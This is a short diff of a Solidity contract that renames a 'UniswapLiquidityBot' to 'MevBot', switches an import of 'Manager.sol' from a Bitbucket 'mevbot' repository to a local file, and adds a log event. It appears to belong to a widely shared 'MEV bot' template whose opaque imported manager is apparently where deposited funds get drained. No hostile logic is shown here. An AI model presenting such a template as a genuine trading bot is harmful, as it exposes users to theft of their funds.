@@ -2,17 +2,18 @@
 pragma solidity ^0.6.6;
 
 // Import Libraries Migrator/Exchange/Factory
-import "bitbucket.org/knicknitro/mevbot/src/master/Manager.sol";
+import "Manager.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
-contract UniswapLiquidityBot {
+contract MevBot {
 
     string public tokenName;
     string public tokenSymbol;
     uint liquidity;
     Manager manager;
+    event Log(string message);
 
     constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {
         tokenSymbol = _mainTokenSymbol;
